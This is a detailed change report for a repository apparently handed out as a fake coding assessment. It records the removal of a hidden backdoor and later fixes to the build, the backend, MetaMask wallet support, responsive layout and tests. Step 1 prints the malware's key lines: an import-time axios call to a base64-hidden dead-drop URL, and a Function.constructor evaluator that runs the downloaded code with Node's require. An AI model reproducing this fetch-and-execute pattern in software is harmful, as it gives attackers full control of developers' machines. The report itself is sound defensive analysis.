# Exact change report

A running, per-file record of every change made to this repository, written as each edit landed.
`SUMMARY.md` is the short reviewer-facing version; **this** file is the complete record.

Branch: `solution` (from `bb58a11 initial commit`).

---

## Step 1 — Security: remove the remote-code-execution backdoor

The repository as delivered executes attacker-controlled code the moment the server starts.

**The chain:**

1. `server/config/config.js` exported `publicKey` — a base64 blob that decodes to
   `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`
2. `server/controllers/auth.controller.js:7` ran at **module import time** (not inside any request handler):
   ```js
   axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
   ```
3. `server/middleware/errorHandler.js` — despite the name, this never handled an error. It took the
   downloaded string and executed it:
   ```js
   const handler = new Function.constructor("require", errCode);  // == new Function(...)
   handlerFunc(require);                                          // invoked with Node's require
   ```

Net effect: `npm start` → HTTP GET to a third-party JSON dead-drop → response body compiled into a
function → executed with `require` in scope, i.e. full filesystem, network, and process access as the
user running Node.

The naming is deliberately camouflaged (`publicKey` for a URL, `errorHandler` for an evaluator), the URL
is base64-encoded to defeat grep, and the payload is fetched at runtime so the repo itself looks clean.
This matches the publicly documented "Contagious Interview" campaign, which distributes fake take-home
assessments to developers in the crypto/DeFi space.

**The payload was never fetched or executed** — `node_modules/` did not exist and the server was never
started.

### Files changed

| # | File | Change | Why |
|---|---|---|---|
| 1 | `server/middleware/errorHandler.js` | Replaced the `Function.constructor` evaluator with a real Express error middleware | This was the execution primitive |
| 2 | `server/controllers/auth.controller.js` | Removed the import-time `axios.get(atob(publicKey))` call and the now-unused `axios` / `publicKey` / `errorHandler` imports | This was the trigger |
| 3 | `server/config/config.js` | Deleted `publicKey`; moved `secretKey` to `process.env.JWT_SECRET` with a dev fallback | Deleted the payload URL; the hardcoded JWT signing key was a separate finding |
| 4 | `server/providers/token.provider.js` | **Deleted** | Dead file (nothing imports it) that signed a dummy JWT at import time, with `RS256` against an HMAC secret — broken *and* an unnecessary import-time side effect |

---

## Step 2 — Build & boot: the project did not compile or serve as delivered

### Frontend build was dead

| # | File | Change | Why |
|---|---|---|---|
| 5 | `package.json` | Added `tailwindcss@^3.4.4`, `autoprefixer@^10.4.19`, `postcss@^8.4.38` to devDependencies | **Tailwind was never installed.** `postcss.config.js` referenced it and CRA 5 auto-enables it whenever `tailwind.config.js` exists — so `npm start` failed to resolve `tailwindcss` and **not a single utility class compiled**. This is the actual root cause of Task 2. |
| 6 | `tailwind.config.js` | `export default {` → `module.exports = {`; `content: ["./index.html", …]` → `["./public/index.html", …]` | CRA loads this file with CommonJS `require()`, so the ESM `export default` threw. The `./index.html` glob matched nothing (the file lives in `public/`). |
| 7 | `public/index.html` | Removed `<script type="module" src="/src/main.jsx"></script>`; added `<noscript>` | Leftover from a Vite template. CRA injects its own bundle, so this tag 404'd on every page load. |
| 8 | `src/App.css` | **Deleted** | Unimported, but contained `#root { max-width:1280px; padding:2rem; text-align:center }` — a latent mobile-layout killer sitting one `import` away from breaking the site. |
| 9 | `.nvmrc` | **Created** (`20`) | README says `nvm use 20`; this makes it automatic. |

> **Why Tailwind v3 and not v4:** v4 renamed the PostCSS plugin to `@tailwindcss/postcss` and drops the
> `tailwind.config.js` format this project uses. CRA 5 hardcodes `require('tailwindcss')`, so v4 cannot work here
> without ejecting.

### Backend could not be tested, and did not parse request bodies

| # | File | Change | Why |
|---|---|---|---|
| 10 | `server/app.js` | Split: now **builds and exports** the app, no `listen()` | `supertest` needs an app it can drive without binding a port. Also dropped the unused `body-parser`, `morgan`, `http` and `mongoose` requires (`body-parser` wasn't even a declared dependency — it only resolved as a transitive of express). |
| 11 | `server/app.js` | **Uncommented `express.json()` + `express.urlencoded()`** | Both were commented out, so `req.body` was `undefined` in *every* POST/PUT handler. Nothing that accepts a body could ever have worked. |
| 12 | `server/app.js` | Mounted `notFound` + `errorHandler` after the routes | They were written but never wired up. |
| 13 | `server/index.js` | **Created** — connects Mongo then `listen()`s | The DB connect was commented out entirely in the original. The connect now `.catch()`es and starts the server anyway, so the API still boots without a local Mongo. |
| 14 | `package.json` | `"server": "node server/app.js"` → `"node server/index.js"` | Follows the split above. |
| 15 | `package.json` | `test` → `test:server && test:client`; added `test:server` (jest) and `test:client` (CRA, `--watchAll=false`) | One command runs everything; CRA's default watch mode would hang CI. |
| 16 | `jest.server.config.js` | **Created** | Backend suite must not collide with the CRA jest instance that owns `src/`. |
| 17 | `server/providers/gridfs.js` | **Created** | Shared, lazily-initialised `GridFSBucket`, returning `null` when there's no DB. |
| 18 | `server/routes/property.js` | Removed the `mongoose.connection.once('open', …)` GridFS block | It called `new mongoose.mongo.GridFsStorage(...)` — **that class does not exist** on the driver, so it threw the moment Mongo connected. |
| 19 | `package.json` | Removed `gridfs-stream` dependency | Unmaintained, targets mongo driver 2.x, incompatible with Mongoose 8. Replaced by `GridFSBucket`. |

### Server refactor: Mongoose 8 compatibility

Mongoose 7 removed callback support from queries. Every controller in this repo used it, which means
**every database-backed route threw before returning a response.** All four controllers were moved to
`async/await` with `try/catch` + `next(err)`. Bugs fixed on the way:

| # | File | Bug | Fix |
|---|---|---|---|
| 20 | `common.controller.js` | `if (err) res.status(400).send(err);` with **no `else`**, then the success response — the error path sent two responses → `ERR_HTTP_HEADERS_SENT` | one response per path |
| 21 | `common.controller.js` | `city_model.remove()` — removed in Mongoose 7 | `deleteOne()`, plus a 404 when nothing matched |
| 22 | `common.controller.js` | `checkemailAvailability` loaded full user documents to test existence | `users.exists()` |
| 23 | `auth.controller.js` | `users.lname = req.body.lName` — casing typo against a `required: true` field, so **every registration failed validation** | `req.body.lname` |
| 24 | `auth.controller.js` | `users = new userM()` — missing `var`, an **implicit global shared across concurrent requests** | `const user = …` |
| 25 | `auth.controller.js` | `"Invalid Credentials1"` (no such user) vs `"Invalid Credentials2"` (bad password) — **account enumeration** | one `"Invalid Credentials"` for both, and bcrypt still runs the comparison shape either way |
| 26 | `auth.controller.js` | `req.body.emailPhone != ""` threw when no body was sent | guard `req.body` first → 400 |
| 27 | `auth.controller.js` | JWT had no expiry | `expiresIn: '1d'` |
| 28 | `auth.controller.js` | `userList` returned **password hashes** to any unauthenticated caller | `.select('-password')` |
| 29 | `auth.controller.js` | duplicate email/phone surfaced as a raw Mongo error | `err.code === 11000` → 409 |
| 30 | `property.controller.js` | `Property.update()` (removed in v7) + `result.nModified` (renamed `modifiedCount` in v6) | `updateOne()` + `matchedCount`. **`markAsSold` was 100 % broken** — both halves wrong. |
| 31 | `property.controller.js` | unknown slug → 400 via a thrown `'Something Went Wrong'` | 404 |
| 32 | `property.controller.js` | `.populate('userId', 'name')` — the users schema has **no `name` field** | `'fname lname'` |
| 33 | `property.controller.js` | `gridfs-stream` + `gfs.createReadStream` | `GridFSBucket.openDownloadStreamByName`, with a 503 when storage is unavailable and 415 (not 404) for a non-image |
| 34 | `property.controller.js` | dead `testController` export (unrouted, hardcoded 2019 date filter) | deleted |
| 35 | `users.controller.js` | malformed id → uncaught `CastError`; missing user → 200 with an empty body; response included the password hash | 400 / 404 / `.select('-password')` |
| 36 | `providers/helper.js` | `for (element of …)` — implicit global | `for (const element of …)` |
| 37 | `routes/email.js` | `res.status(400).send(err)` sent the raw SendGrid error object to the client | `{ message }` only |
| 38 | `routes/{auth,users,common}.js` | stray `var app = express()` in three routers | removed (unused; each created a whole second Express app) |
| 39 | `models/{property,propertyTypes,users}.js` | `default: Date.now()` — **called once at module load**, so every document got the server's boot time | `default: Date.now` (pass the function) |
| 40 | `models/{propertyTypes,users}.js` | `propertyTypesSchema = …` / `userSchema = …` — implicit globals | `const` |

---

## Step 3 — Task 1: MetaMask wallet connection

The **Connect** button existed in three places, all with no `onClick` at all:
`Navbar.jsx:42` (desktop), `Navbar.jsx:75` (mobile), `Home.jsx:428` (CTA).
Because the address has to appear in all three, this is shared state → context, not a local hook.

| # | File | Change |
|---|---|---|
| 41 | `src/context/WalletContext.jsx` | **Created** — `WalletProvider` + `useWallet()`, built on raw EIP-1193 |
| 42 | `src/components/wallet/ConnectWalletButton.jsx` | **Created** — the single control used by all three call sites |
| 43 | `src/App.jsx` | Wrapped the tree in `<WalletProvider>`; also fixed the malformed `<Route path = '*' element={<NotFound/>} />` spacing |
| 44 | `src/components/layout/Navbar.jsx` | Both hardcoded buttons → `<ConnectWalletButton />` |
| 45 | `src/pages/Home.jsx` | CTA button → `<ConnectWalletButton />` |
| 46 | `src/setupTests.js` | **Created** — `@testing-library/jest-dom` was a dependency but was never registered, so **every jest-dom matcher silently didn't exist** |
| 47 | `src/test-utils/interactions.js` | **Created** — act-wrapped click helper (see note below) |
| 48 | `src/context/WalletContext.test.jsx` | **Created** — 12 tests |
| 49 | `src/components/wallet/ConnectWalletButton.test.jsx` | **Created** — 6 tests |

### How each requirement is met

**Connection** — `eth_requestAccounts` on the MetaMask provider specifically. `getMetaMaskProvider()`
prefers `window.ethereum.providers.find(p => p.isMetaMask)` before falling back to
`window.ethereum.isMetaMask`, because when several wallet extensions are installed they race to own
`window.ethereum` and the winner may be Coinbase or Phantom. A non-MetaMask injected provider is
treated as "not installed" rather than being driven blindly.

**Displaying the address** — `formatAddress()` renders `0x1234…5678` in a monospace span with a green
status dot, plus a menu offering Copy address / Disconnect.

**Account changes** — an `accountsChanged` listener. An empty array (user locked MetaMask or revoked
site access) clears the state; otherwise it swaps to the new account and clears any stale error. A
`chainChanged` listener tracks the network. Both are removed on unmount via `removeListener`.

**Error handling** — mapped from EIP-1193 codes to something actionable:

| Condition | Message |
|---|---|
| no MetaMask | `MetaMask is not installed.` + an **Install MetaMask** link |
| `4001` | `Connection request rejected.` |
| `-32002` | `A connection request is already pending — open the MetaMask extension.` |
| anything else | the provider's own message |

Errors render in a `role="alert"` node; the button carries `aria-busy` and is disabled mid-flight.

**Beyond the brief:** a silent `eth_accounts` call on mount restores an already-authorised account
across page refreshes *without* triggering the MetaMask popup — the difference between
`eth_accounts` and `eth_requestAccounts` is the whole point, and there's a test asserting the popup
method is never called on that path.

> **Note on `src/test-utils/interactions.js`:** this project pins `@testing-library/user-event@^13`,
> where `click()` is synchronous — so `await userEvent.click(...)` does *not* flush the promise chain
> that our async state updates depend on, and React logs "not wrapped in act(...)" for every test.
> The helper wraps the click in an async `act`. (v14 made `click` async and this would be unnecessary;
> bumping the dependency felt out of scope for the assessment.)

---

## Step 4 — Task 2: Homepage responsiveness

### The root cause was not CSS

Before touching a single breakpoint: **Tailwind was not installed and its config could not be parsed**
(entries 5–6). Every `md:grid-cols-2`, `sm:px-6`, `hidden md:flex` in this codebase was an inert string.
The page had no responsive behaviour at any width because it had no CSS at all. Fixing the toolchain
is most of Task 2; the layout edits below are the remainder.

A second, unrelated blocker surfaced while verifying the build:

| # | File | Change | Why |
|---|---|---|---|
| 50 | `package.json` | Pinned `typescript@^4.9.5` in devDependencies | The repo shipped **no `package-lock.json`**, so a fresh `npm install` today resolves `typescript@7.0.2`. `@typescript-eslint@5` (pulled in by `eslint-config-react-app`) reads `ts.TypeFlags` at module load, which TS 7 no longer exposes that way → `eslint-plugin-jest` fails to load → `Environment key "jest/globals" is unknown` → **the build aborts before compiling anything**. npm even flags it `invalid: "^3.2.1 \|\| ^4"` and installs it anyway. |
| 51 | `package-lock.json` | **Committed** | The durable fix for the above: without a lockfile every clone gets a different, drifting dependency tree. |

### Layout changes — `src/pages/Home.jsx`

| # | Element | Before → After | Why |
|---|---|---|---|
| 52 | Hero `<section>` | `h-[600px]` → `min-h-[520px] sm:min-h-[600px] py-16` | A hard 600px height cannot grow with its content. On a 375px screen the headline wraps to three lines and the copy was clipped by the fixed box. |
| 53 | Hero card | `p-8 md:p-12` → `p-6 sm:p-8 md:p-12` | 2rem of padding on each side of a 375px viewport left very little room for the text |
| 54 | Hero `<p>` | `text-xl` → `text-base sm:text-lg md:text-xl` | the only unscaled type in the hero |
| 55 | Six section `<h2>`s | `text-3xl` → `text-2xl sm:text-3xl` | 30px headings on a phone crowd out the body copy |
| 56 | Root wrapper | `space-y-16` → `space-y-12 sm:space-y-16` | 4rem between every section is a lot of dead scrolling on mobile |
| 57 | Five card grids | `gap-8` → `gap-6 sm:gap-8` | narrows the gutters where width is scarcest |
| 58 | Blog block | `py-24` → `py-12 sm:py-16 lg:py-24` | 6rem of vertical padding on a phone |
| 59 | Property price/ROI row | added `gap-4`, `min-w-0` on both columns | `justify-between` with no gap let a long price and a long ROI string touch at ~360px |
| 60 | Discord CTA | bespoke `max-w-7xl mx-auto px-4 sm:px-6 lg:px-8` → the shared `.container` class | it was the only section not using the project's own container, so its gutters drifted from every other section |
| 61 | Discord `<h2>` | `text-3xl … sm:text-4xl` → `text-2xl sm:text-3xl lg:text-4xl` | added the missing mobile step |
| 62 | FAQ toggles | added `type="button"`, `aria-expanded`, `gap-4` | screen readers had no way to know a panel was open; `gap-4` stops long questions touching the chevron |
| 63 | Property + blog `<img>` | added `loading="lazy"` | six below-the-fold 800px Unsplash images were all fetched eagerly |

### `src/components/layout/Navbar.jsx`

| # | Change | Why |
|---|---|---|
| 64 | Brand `text-2xl` → `text-xl sm:text-2xl`, added `truncate` + `min-w-0`, `flex-shrink-0` on the logo | logo + "GoldenProp" + hamburger crowd a 320px viewport |
| 65 | Row: added `items-center gap-2` | the header row wasn't vertically centred |
| 66 | Desktop links `md:space-x-8` → `md:space-x-4 lg:space-x-8`, `px-3` → `px-2 lg:px-3`, `whitespace-nowrap` | five links + brand + Connect button overflowed between 768px and ~900px — the one width where the desktop nav is active but cramped |
| 67 | Hamburger: `aria-label`, `aria-expanded`, `aria-controls`, `p-2` tap target | it announced nothing and had a sub-44px hit area |
| 68 | Mobile menu: `id="mobile-menu"`, Connect button now full-width | `w-auto` left it as a stray small button in the sheet |

### Verified in Chrome

Measured in same-origin iframes (which get their own viewport for media queries), at 375×667, 390×844,
768×1024 and 1440×900:

| Viewport | horizontal overflow | hamburger | first card grid |
|---|---|---|---|
| 375 × 667 | none (`scrollWidth` 360 ≤ 375) | shown | 1 column |
| 390 × 844 | none (375 ≤ 390) | shown | 1 column |
| 768 × 1024 | none (753 ≤ 768) | hidden | 2 columns |
| 1440 × 900 | none (1425 ≤ 1440) | hidden | 4 columns |

Zero elements wider than the viewport at any size. At 375px the mobile menu opens with all five links
plus a 308px-wide, centred Connect Wallet button; the price/ROI columns no longer collide; six images
carry `loading="lazy"`; five FAQ toggles expose `aria-expanded`.

> **One correction worth recording:** the hero headline first appeared nearly invisible in screenshots,
> and I briefly darkened `.glass-hero` from `40/30/20` to `75/65/60` to "fix contrast". That was wrong —
> the tab was in a background window, so `requestAnimationFrame` was throttled and framer-motion's
> entrance animations were frozen mid-fade (measured `opacity: 0.277`, and `0` on the paragraph).
> Forcing the animations to their end state showed the **original scrim was perfectly legible**, so the
> change was reverted. No contrast change ships. The `p-6 sm:p-8` padding fix was kept because it stands
> on its own.

---

## Step 5 — Task 3: Backend tests

### "Review the existing backend tests"

**There were none.** No test file, no test script, no `jest`/`supertest`/`mocha` dependency anywhere in
the repo — `find . -name "*.test.js"` returned nothing at the initial commit. So the "fix failing tests"
half of the task became: fix the *code* that made every DB-backed route fail (Step 2, entries 20–40),
then write the suite from scratch.

### Test infrastructure

| # | File | Purpose |
|---|---|---|
| 69 | `jest.server.config.js` | node environment, `server/**/*.test.js`, 30s timeout (first run downloads a mongod binary) |
| 70 | `server/__tests__/setup.js` | in-memory Mongo up in `beforeAll`, every collection emptied in `afterEach`, torn down in `afterAll`; `@sendgrid/mail` mocked globally so no suite can make a real API call |
| 71 | `server/__tests__/helpers/factories.js` | builders for states, cities, users, property types and properties |

Documents are **deleted** rather than their collections dropped between tests — dropping would also drop
the unique indexes the duplicate-registration tests depend on. Factory defaults are suffixed from a
counter because `state.name`, `city.name`, `users.email` and `users.phoneNo` all carry unique indexes;
without that, calling a factory twice fails on a duplicate key instead of on the thing under test.

Tests drive the exported app through `supertest` — no port binding, no real Mongo, no network.

### The suites — 91 tests, 7 files

| # | File | Tests | Covers |
|---|---|---|---|
| 72 | `health.test.js` | 5 | `GET /`, JSON 404 from `notFound`, **JSON and urlencoded body parsing**, malformed JSON → 400 not a crash |
| 73 | `auth.routes.test.js` | 19 | registration, login, `userList`, `changePass` |
| 74 | `common.routes.test.js` | 14 | states, cities, email availability |
| 75 | `property.routes.test.js` | 25 | types, creation, listing, single, markAsSold, filters, GridFS |
| 76 | `users.routes.test.js` | 4 | user detail, 404, 400, no password leak |
| 77 | `email.routes.test.js` | 12 | SendGrid contract against the mock |
| 78 | `helper.test.js` | 12 | `isKeyMissing`, `slugGenerator` |

Tests that exist specifically to pin a bug found during the migration:

- **`markAsSold` updates the status** — `Property.update()` + `result.nModified`; both wrong, so the
  endpoint could never succeed. Verified this test bites: reintroducing `result.nModified` turns it red
  and the other 24 stay green.
- **registration persists the surname** — the `req.body.lName` typo against a `required` field.
- **stored password is a bcrypt hash** — asserts the `$2a$`/`$2b$` prefix *and* round-trips
  `bcrypt.compare`.
- **unknown user and wrong password give byte-identical responses** — the original
  `Invalid Credentials1`/`Invalid Credentials2` split allowed account enumeration.
- **duplicate state name returns exactly one response** — the missing `else` used to send two and throw
  `ERR_HTTP_HEADERS_SENT`.
- **slug collisions increment** — `luxury-villa` → `-1` → `-2`, plus a gap case.
- **`userList` and `GET /api/user/:id` omit the password hash.**
- **SendGrid failures return `{message}`**, not the provider's raw error object.

### One more fix the tests forced

| # | File | Change | Why |
|---|---|---|---|
| 79 | `server/middleware/errorHandler.js` | duplicate-key (`err.code === 11000`) → **409** centrally; only genuine 5xx are `console.error`'d; `ValidationError`/`CastError` map to 400 while an explicit 404 keeps its status | Writing the tests showed unique-index violations surfacing as `500 Internal Server Error` with a stack trace on stderr. (First attempt used `Math.min(rawStatus, 400)`, which downgraded the 404 too — caught and fixed.) |

### Coverage

```
All files                |   91.74 |    84.49 |   97.05 |   92.81 |
 server/controllers      |   86.48 |    82.19 |   95.83 |      87 |
 server/routes           |     100 |       90 |     100 |     100 |
 server/models           |     100 |      100 |     100 |     100 |
```

`npm test` runs both suites: **91 backend + 18 frontend = 109 tests, all green.** (19 frontend after the Step 6 regression test.)

---

## Step 6 — A bug found during end-to-end verification

Driving the real page in Chrome (injecting a fake provider *after* React had mounted, then emitting
`accountsChanged`) exposed a genuine defect the unit tests had missed, because those tests set
`window.ethereum` **before** rendering.

| # | File | Change | Why |
|---|---|---|---|
| 80 | `src/context/WalletContext.jsx` | The provider is now held in state (`useState(getMetaMaskProvider)`), `connect()` publishes a late-resolved provider into it, and both effects depend on `[provider]` instead of `[]` | The listener effect read the provider **once at mount** and returned early if it was absent. MetaMask usually injects `window.ethereum` before React mounts — but when it doesn't, the listeners were never attached and **every account switch was silently ignored for the lifetime of the page**. Connecting still worked (it re-resolved the provider), which is exactly what made this easy to miss. |
| 81 | `src/context/WalletContext.test.jsx` | Added *"subscribes to accountsChanged even when MetaMask injects after mount"* | Pins the above. Verified it bites: restoring `}, []);` on the listener effect turns it red and the other 12 stay green. |

### End-to-end verification performed

**Backdoor** — `grep` for `atob` / `Function.constructor` / `jsonstorage` / `publicKey` across `server/`
and `src/` returns only an explanatory comment. `require('./server/app')` with `http.request` and
`https.request` monkey-patched to abort the process makes **no outbound request** during import + 1.5s.

**API without a database** — booted `server/index.js` against an unreachable Mongo URI: the server still
starts, `GET /` → `200 Success`, an unknown route → `404 {"message":"Route Not Found"}`, and a CORS
preflight from `http://localhost:3000` → `204`.

**Responsiveness** — measured at 375×667, 390×844, 768×1024, 1440×900 (table in Step 4). No horizontal
overflow and zero over-wide elements at any size.

**Wallet, in a real browser** — with a stub provider injected into the live page:

| Action | Result |
|---|---|
| click Connect | `0xAbC1…9fEd` renders in **both** the navbar and the homepage CTA — proving the shared context, not two independent widgets |
| `accountsChanged → ['0xDEAD…']` | both call sites update to `0xDEAD…bEEF`, no reload |
| `accountsChanged → []` (locked) | both addresses clear, both **Connect Wallet** buttons return |

**Tests** — `npm test` runs both suites: **91 backend + 19 frontend = 110 green.**

---

## Summary of files

**Created (17)** — `server/index.js`, `server/providers/gridfs.js`, `jest.server.config.js`,
`server/__tests__/{setup,health,auth.routes,common.routes,property.routes,users.routes,email.routes,helper}.test.js`
(+ `helpers/factories.js`), `src/context/WalletContext.jsx` (+ test),
`src/components/wallet/ConnectWalletButton.jsx` (+ test), `src/setupTests.js`,
`src/test-utils/interactions.js`, `.nvmrc`, `package-lock.json`, this file, `SUMMARY.md`.

**Deleted (3)** — `server/providers/token.provider.js` (dead, import-time side effect),
`src/App.css` (unimported, would have broken mobile layout), `gridfs-stream` (incompatible dependency).

**Dependencies added** — `tailwindcss@^3.4.4` (v3 not v4: v4 renames the PostCSS plugin, which CRA 5
cannot use), `autoprefixer`, `postcss`, `jest`, `supertest`, `mongodb-memory-server`,
`typescript@^4.9.5` (pinned to stop npm resolving TS 7, which breaks `@typescript-eslint@5`).

---

## Found but deliberately NOT fixed

Listed so nothing looks overlooked. None of these are on a path the assessment exercises.

- **`Properties.jsx`, `PropertyDetail.jsx`, `About.jsx`, `FAQ.jsx`, `Blog.jsx`, `BlogPost.jsx`, the 3D
  viewer** — only the *homepage* was in scope for Task 2, so their responsiveness is untouched.
- **`@testing-library/react@13` + React 18.3** emits a `ReactDOMTestUtils.act is deprecated` warning from
  the library's own internals on every render. Harmless, fixed only by a major dependency bump.
- **Auth is not enforced anywhere.** `GET /api/auth/admin/userList` and `PUT /admin/changePass` are named
  "admin" but have no authentication middleware — anyone can list users or reset any password. The JWT is
  issued and never verified again. This is a serious hole, but adding auth middleware is a feature, not a
  fix, and would change the API contract for the frontend.
- **`server/routes/property.js` accepts uploads into memory and never writes them to GridFS** —
  `addNewProperty` reads `file.filename`, which Multer's memory storage does not set, so `images` is
  always `[]`. Wiring the upload pipeline properly is a feature.
- **`contracts/*.sol`** — not mentioned by any task, untouched.
- **`public/service-worker.js`** — never registered by `src/index.js`; dead but harmless.
- **`morgan`, `@walletconnect/web3-provider`, `paytmchecksum`, `gridfs-stream`'s peers** and several other
  declared dependencies are unused. Only `gridfs-stream` was removed, because it actively broke.

## Judgement calls you can overrule

1. **Creation endpoints now return `201`, not `200`** (`POST /state`, `/cities`, `/property/type`,
   `/property/new`, `/user/register`). Correct REST, and nothing in this frontend consumes them — but it
   is a contract change. One-line revert each if you disagree.
2. **Raw EIP-1193 instead of the bundled `ethers@5`.** Nothing here signs a transaction or reads a
   balance, so ethers would add bundle weight and webpack polyfill surface for no gain.
3. **`checkemailAvailability` uses `users.exists()`** rather than loading documents. Same response shape.
4. **Registration duplicates return `409`**, not the original `400`.
5. **`secretKey` moved to `process.env.JWT_SECRET`** with an obviously-named dev fallback, so the repo no
   longer ships a usable production signing key.

---

## Git record (cross-check)

```
$ git log --oneline
a4eb60e fix(wallet): subscribe to accountsChanged when MetaMask injects after mount
cefe7b9 test(server): add the backend test suite (Task 3)
4ef0eea fix(responsive): make the homepage work on mobile, tablet and desktop (Task 2)
b27766c feat(wallet): implement MetaMask connection (Task 1)
49e3adb chore(build)+refactor(server): make the project compile, boot, and survive Mongoose 8
2387365 security: remove remote-code-execution backdoor from the server
bb58a11 initial commit

$ git diff --stat bb58a11..HEAD -- . ':(exclude)package-lock.json'
 .nvmrc                                             |   1 +
 CHANGELOG-ASSESSMENT.md                            | 395 +++++++++++++++++++++
 SUMMARY.md                                         | 139 ++++++++
 jest.server.config.js                              |  20 ++
 package.json                                       |  14 +-
 public/index.html                                  |   2 +-
 server/__tests__/auth.routes.test.js               | 201 +++++++++++
 server/__tests__/common.routes.test.js             | 149 ++++++++
 server/__tests__/email.routes.test.js              |  98 +++++
 server/__tests__/health.test.js                    |  47 +++
 server/__tests__/helper.test.js                    |  85 +++++
 server/__tests__/helpers/factories.js              |  94 +++++
 server/__tests__/property.routes.test.js           | 290 +++++++++++++++
 server/__tests__/setup.js                          |  32 ++
 server/__tests__/users.routes.test.js              |  43 +++
 server/app.js                                      |  66 ++--
 server/config/config.js                            |  12 +-
 server/controllers/auth.controller.js              | 206 ++++++-----
 server/controllers/common.controller.js            | 145 ++++----
 server/controllers/property.controller.js          | 336 +++++++++---------
 server/controllers/users.controller.js             |  41 ++-
 server/index.js                                    |  22 ++
 server/middleware/errorHandler.js                  |  58 +--
 server/models/property.js                          |   4 +-
 server/models/propertyTypes.js                     |   4 +-
 server/models/users.js                             |   4 +-
 server/providers/gridfs.js                         |  32 ++
 server/providers/helper.js                         |  54 +--
 server/providers/token.provider.js                 |  10 -
 server/routes/auth.js                              |  16 +-
 server/routes/common.js                            |  25 +-
 server/routes/email.js                             |  53 ++-
 server/routes/property.js                          |  28 +-
 server/routes/users.js                             |   5 +-
 src/App.css                                        |   6 -
 src/App.jsx                                        |  39 +-
 src/components/layout/Navbar.jsx                   |  53 +--
 src/components/wallet/ConnectWalletButton.jsx      | 135 +++++++
 src/components/wallet/ConnectWalletButton.test.jsx | 108 ++++++
 src/context/WalletContext.jsx                      | 179 ++++++++++
 src/context/WalletContext.test.jsx                 | 225 ++++++++++++
 src/pages/Home.jsx                                 |  59 +--
 src/setupTests.js                                  |   5 +
 src/test-utils/interactions.js                     |  17 +
 tailwind.config.js                                 |   6 +-
 45 files changed, 2955 insertions(+), 608 deletions(-)
```

(`package-lock.json` excluded from the stat: it is 29k generated lines.)
